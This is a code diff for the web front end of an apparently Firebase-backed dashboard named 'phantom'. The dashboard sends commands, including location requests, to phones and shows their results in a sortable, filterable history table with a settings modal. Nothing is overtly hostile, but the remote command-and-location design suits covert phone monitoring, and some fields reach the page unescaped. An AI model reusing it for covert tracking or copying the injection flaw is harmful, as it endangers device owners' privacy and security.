-        renderDeviceSelect();
-    } catch(e) {
-        console.error('Load devices error:', e);
-        toast('Failed to load devices: ' + e.message, 'error');
-    }
-}
-
-function renderDeviceList() {
-    const list = document.getElementById('deviceList');
-    if (state.devices.length === 0) {
-        list.innerHTML = '<div class="empty">No devices assigned to your account</div>';
+    if (!deviceId || !firebaseInitialized || !db) {
+        document.getElementById('historyBody').innerHTML =
+            '<tr><td colspan="5" style="text-align:center;padding:40px;color:#6b7280;">Select a device first</td></tr>';
         return;
     }
-    list.innerHTML = state.devices.map(d => {
-        const timeAgo = d.lastSeen ? Math.round((Date.now() - d.lastSeen.getTime())/1000) + 's ago' : 'never';
-        return '<div class="device-item ' + (d.id === state.selectedDeviceId ? 'active' : '') +
-            '" onclick="selectDevice(\'' + d.id + '\')">' +
-            '<div class="device-icon">📱</div>' +
-            '<div class="device-info">' +
-            '<div class="device-name">' + escapeHtml(d.name) + '</div>' +
-            '<div class="device-meta">' + escapeHtml(d.model) + ' · ' + escapeHtml(d.platform) + '</div>' +
-            '</div>' +
-            '<div class="device-status">' +
-            '<span class="status-dot ' + (d.isOnline ? 'online' : 'offline') + '"></span>' +
-            '<span class="status-label">' + (d.isOnline ? 'Online' : 'Offline') + '</span>' +
-            '</div>' +
-            '</div>';
+
+    document.getElementById('historyBody').innerHTML =
+        '<tr><td colspan="5" style="text-align:center;padding:40px;"><span class="loading-spinner" style="width:18px;height:18px;border-width:2px;vertical-align:middle;margin-right:8px;"></span> Loading history…</td></tr>';
+
+    try {
+        const cmdSnap = await db.collection('commands').where('deviceId', '==', deviceId).get();
+        const resultSnap = await db.collection('results').get();
+        const resultMap = {};
+        resultSnap.forEach(doc => { resultMap[doc.id] = doc.data(); });
+
+        const historyItems = [];
+        cmdSnap.forEach(doc => {
+            const cmdData = doc.data();
+            const cmdId = doc.id;
+            const resultData = resultMap[cmdId];
+            historyItems.push({
+                id: cmdId,
+                action: cmdData.action || '?',
+                time: new Date(cmdData.createdAt || 0),
+                timeStr: new Date(cmdData.createdAt || 0).toLocaleString(),
+                status: resultData ? (resultData.status || 'ok') : 'pending',
+                output: resultData ? (resultData.output || '—') : '⏳ Not yet executed',
+                params: cmdData.params || {}
+            });
+        });
+
+        state.historyData = historyItems;
+        state.historyFiltered = [...historyItems];
+
+        const actionFilter = document.getElementById('histActionFilter');
+        const actions = [...new Set(historyItems.map(h => h.action))].sort();
+        actionFilter.innerHTML = '<option value="all">All Actions</option>' +
+            actions.map(a => `<option value="${a}">${a}</option>`).join('');
+
+        state.historySortKey = 'time';
+        state.historySortAsc = false;
+        sortHistory('time');
+        renderHistoryTable();
+
+        toast(`📋 Loaded ${historyItems.length} history entries`, 'info');
+    } catch (e) {
+        appendDiag(`❌ History load error: ${e.message}`);
+        document.getElementById('historyBody').innerHTML =
+            `<tr><td colspan="5" style="text-align:center;padding:40px;color:#f87171;">Error: ${escapeHtml(e.message)}</td></tr>`;
+    }
+}
+
+function sortHistory(key) {
+    ['time', 'action', 'status', 'output'].forEach(k => {
+        const el = document.getElementById('sortArrow' + k.charAt(0).toUpperCase() + k.slice(1));
+        if (el) el.textContent = (k === key) ? (state.historySortAsc ? '▲' : '▼') : '';
+    });
+    if (state.historySortKey === key) state.historySortAsc = !state.historySortAsc;
+    else { state.historySortKey = key; state.historySortAsc = (key === 'time') ? false : true; }
+
+    const sorted = [...state.historyFiltered];
+    sorted.sort((a, b) => {
+        let va, vb;
+        if (key === 'time') { va = a.time.getTime(); vb = b.time.getTime(); }
+        else if (key === 'action') { va = a.action; vb = b.action; }
+        else if (key === 'status') { va = a.status; vb = b.status; }
+        else if (key === 'output') { va = a.output; vb = b.output; }
+        else return 0;
+        if (va < vb) return state.historySortAsc ? -1 : 1;
+        if (va > vb) return state.historySortAsc ? 1 : -1;
+        return 0;
+    });
+
+    state.historyFiltered = sorted;
+    renderHistoryTable();
+}
+
+function filterHistory() {
+    const search = document.getElementById('histSearch').value.toLowerCase();
+    const statusFilter = document.getElementById('histStatusFilter').value;
+    const actionFilter = document.getElementById('histActionFilter').value;
+
+    state.historyFiltered = state.historyData.filter(h => {
+        if (statusFilter !== 'all' && h.status !== statusFilter) return false;
+        if (actionFilter !== 'all' && h.action !== actionFilter) return false;
+        if (search && !h.output.toLowerCase().includes(search) &&
+            !h.action.toLowerCase().includes(search) &&
+            !JSON.stringify(h.params).toLowerCase().includes(search)) return false;
+        return true;
+    });
+    renderHistoryTable();
+}
+
+function renderHistoryTable() {
+    const tbody = document.getElementById('historyBody');
+    const count = state.historyFiltered.length;
+    document.getElementById('histCountDisplay').textContent = `${count} / ${state.historyData.length} entries`;
+
+    if (count === 0) {
+        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:40px;color:#6b7280;">No matching entries</td></tr>';
+        return;
+    }
+
+    tbody.innerHTML = state.historyFiltered.map(h => {
+        const rowClass = h.status === 'error' || h.status === 'write_fail' ? 'ht-row-error' :
+                        h.status === 'ok' ? 'ht-row-ok' : '';
+        const paramsStr = Object.keys(h.params).length > 0 ? escapeHtml(JSON.stringify(h.params)).slice(0, 80) : '—';
+        const outputTruncated = h.output.length > 80
+            ? escapeHtml(h.output.slice(0, 80)) + '…'
+            : escapeHtml(h.output);
+        const isLong = h.output.length > 80;
+
+        return `<tr class="${rowClass}">
+            <td class="ht-time">${h.timeStr}</td>
+            <td class="ht-action">${escapeHtml(h.action)}</td>
+            <td><span class="ht-status ${h.status}">${h.status}</span></td>
+            <td style="font-size:11px;color:#6b7280;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${escapeHtml(paramsStr)}">${paramsStr}</td>
+            <td>
+                <span class="ht-output" id="ht_out_${escapeHtml(h.id)}">${outputTruncated}</span>
+                ${isLong ? `<span class="ht-expand-btn" onclick="toggleHistOutput('${escapeHtml(h.id)}')">expand</span>` : ''}
+            </td>
+        </tr>`;
     }).join('');
 }
 
-function renderDeviceSelect() {
-    const select = document.getElementById('deviceSelect');
-    select.innerHTML = '<option value="">— Select device —</option>' +
-        state.devices.map(d => '<option value="' + d.id + '">' + escapeHtml(d.name) + ' (' + (d.isOnline ? '●' : '○') + ')</option>').join('');
-    if (state.selectedDeviceId) select.value = state.selectedDeviceId;
-}
-
-function onDeviceSelectChange() {
-    const select = document.getElementById('deviceSelect');
-    if (select.value) selectDevice(select.value);
-}
-
-function selectDevice(id) {
-    state.selectedDeviceId = id;
-    renderDeviceList();
-    renderDeviceSelect();
-    const device = state.devices.find(d => d.id === id);
-    if (device) {
-        document.getElementById('selectedDeviceName').textContent = device.name;
-        document.getElementById('deviceNameDetail').textContent = device.name;
-        document.getElementById('deviceModelDetail').textContent = device.model;
-        document.getElementById('devicePlatformDetail').textContent = device.platform;
-        document.getElementById('deviceIdDetail').textContent = id;
-        const isOnline = device.isOnline;
-        document.getElementById('deviceStatusText').textContent = isOnline ? 'Online' : 'Offline';
-        document.getElementById('deviceStatusText').className = isOnline ? 'online' : 'offline';
-        document.getElementById('pingOnlineBadge').textContent = isOnline ? '● Online' : '○ Offline';
-        document.getElementById('pingOnlineBadge').className = isOnline ? 'online' : 'offline';
-        document.getElementById('pingStatus').textContent = isOnline ? 'ONLINE' : 'OFFLINE';
-        document.getElementById('pingStatus').className = isOnline ? 'value green' : 'value red';
-        document.getElementById('pingLastSeen').textContent = device.lastSeen
-            ? device.lastSeen.toLocaleString() : '—';
-    }
-    setupPingWatch();
-    showView('dashboard');
+function toggleHistOutput(id) {
+    const el = document.getElementById('ht_out_' + id);
+    if (!el) return;
+    el.classList.toggle('expanded');
+    const btn = el.nextElementSibling;
+    if (btn) btn.textContent = el.classList.contains('expanded') ? 'collapse' : 'expand';
 }
 
 // ═══════════════════════════════════════════════════════════════════
-//  FIX 1: updateDeviceStatus — updates local state + re-renders
+//  SETTINGS
 // ═══════════════════════════════════════════════════════════════════
-function updateDeviceStatus(id, isOnline) {
-    const dev = state.devices.find(d => d.id === id);
-    if (dev && dev.isOnline !== isOnline) {
-        dev.isOnline = isOnline;
-        renderDeviceList();
-        renderDeviceSelect();
-    }
+function openSettings() {
+    const cfg = getConfig();
+    document.getElementById('cfg_apiKey').value = cfg.apiKey || '';
+    document.getElementById('cfg_authDomain').value = cfg.authDomain || '';
+    document.getElementById('cfg_projectId').value = cfg.projectId || '';
+    document.getElementById('cfg_storageBucket').value = cfg.storageBucket || '';
+    document.getElementById('cfg_messagingSenderId').value = cfg.messagingSenderId || '';
+    document.getElementById('cfg_appId').value = cfg.appId || '';
+    document.getElementById('settingsModal').classList.add('open');
 }
 
-// ═══════════════════════════════════════════════════════════════════
-//  FIX 2: Global result listener — matches on ANY status to catch
-//  results that arrive while local status is still 'sending'
-// ═══════════════════════════════════════════════════════════════════
-let globalResultUnsub = null;
+function closeSettings() { document.getElementById('settingsModal').classList.remove('open'); }
 
-function setupResultListener() {
-    if (globalResultUnsub) globalResultUnsub();
-    if (!db) return;
+function saveSettingsAndReconnect() {
+    const config = {
+        apiKey: document.getElementById('cfg_apiKey').value.trim(),
+        authDomain: document.getElementById('cfg_authDomain').value.trim(),
+        projectId: document.getElementById('cfg_projectId').value.trim(),
+        storageBucket: document.getElementById('cfg_storageBucket').value.trim(),
+        messagingSenderId: document.getElementById('cfg_messagingSenderId').value.trim(),
+        appId: document.getElementById('cfg_appId').value.trim(),
+    };
+    if (!config.apiKey || !config.projectId) { toast('API Key and Project ID required', 'error'); return; }
+    localStorage.setItem('phantom_firebase_config', JSON.stringify(config));
+    closeSettings();
+    toast('Config saved. Reloading…', 'info');
+    setTimeout(() => location.reload(), 500);
+}
 
-    globalResultUnsub = db.collection('results')
-        .orderBy('createdAt', 'desc')
-        .limit(50)
-        .onSnapshot(snap => {
-            snap.docChanges().forEach(change => {
-                if (change.type !== 'added') return;
-                const d = change.doc.data();
-                const cmdId = change.doc.id;
-                // FIX 2: Match regardless — the status could be 'sending' or 'sent'
-                // when the result arrives
-                const existing = state.results.find(r => r.id === cmdId);
-                if (existing) {
-                    existing.status = d.status || 'ok';
-                    existing.output = d.output || '—';
-                    renderCmdResults();
-                    if (d.action === 'get_location') handleLocationResult(d, cmdId);
-                } else if (d.deviceId === state.selectedDeviceId) {
-                    // Result arrived for a command we didn't track locally
-                    state.results.unshift({
-                        id: cmdId,
-                        action: d.action || '—',
-                        name: d.action || 'Command',
-                        status: d.status || 'ok',
-                        output: d.output || '—',
-                        time: d.createdAt
-                            ? new Date(d.createdAt.toDate()).toLocaleTimeString()
-                            : '—',
-                        params: d.params || {}
-                    });
-                    renderCmdResults();
-                    if (d.action === 'get_location') handleLocationResult(d, cmdId);
-                }
-            });
+document.getElementById('settingsModal').addEventListener('click', function(e) {
+    if (e.target === this) closeSettings();
+});
+
+// ═══════════════════════════════════════════════════════════════════
+//  UTILITY
+// ═══════════════════════════════════════════════════════════════════
+function toast(msg, type) {
+    const c = document.getElementById('toastContainer');
+    const el = document.createElement('div');
+    el.className = 'toast ' + (type || 'info');
+    el.textContent = msg;
+    c.appendChild(el);
+    setTimeout(() => {
+        el.style.opacity = '0';
+        el.style.transform = 'translateX(20px)';
+        el.style.transition = 'all 0.3s';
+        setTimeout(() => el.remove(), 300);
+    }, 4000);
+}
+
+function escapeHtml(s) {
+    if (!s) return '';
+    const d = document.createElement('div');
+    d.textContent = s;
+    return d.innerHTML;
+}
+
+// ── Auto-init commands on DOM ready ──
+document.addEventListener('DOMContentLoaded', () => {
+    // Commands already rendered by init
+});
+
+// ── Login enter key support ──
+document.addEventListener('DOMContentLoaded', () => {
+    const emailInput = document.getElementById('loginEmail');
+    const passInput = document.getElementById('loginPass');
+    if (emailInput) {
+        emailInput.addEventListener('keydown', e => {
+            if (e.key === 'Enter') passInput?.focus();
         });
-}
-
-// ═══════════════════════════════════════════════════════════════════
-//  INIT ON PAGE LOAD
-// ═══════════════════════════════════════════════════════════════════
-document.addEventListener('DOMContentLoaded', function() {
-    const saved = localStorage.getItem('phantom_settings');
-    if (saved) {
-        try { state.settings = { ...state.settings, ...JSON.parse(saved) }; } catch(e) {}
     }
-    renderCmdCategories('device');
-
-    // Check for existing auth
-    initFirebase();
-    firebase.auth().onAuthStateChanged(user => {
-        if (user) {
-            state.userId = user.uid;
-            state.userEmail = user.email;
-            document.getElementById('loginScreen').style.display = 'none';
-            document.getElementById('appShell').style.display = 'flex';
-            document.getElementById('usernameDisplay').textContent = user.email.split('@')[0];
-            startStatusRefresh();
-            loadDevices();
-            setupResultListener();
-        }
-    });
+    if (passInput) {
+        passInput.addEventListener('keydown', e => {
+            if (e.key === 'Enter') handleLogin();
+        });
+    }
 });
 </script>
 </body>
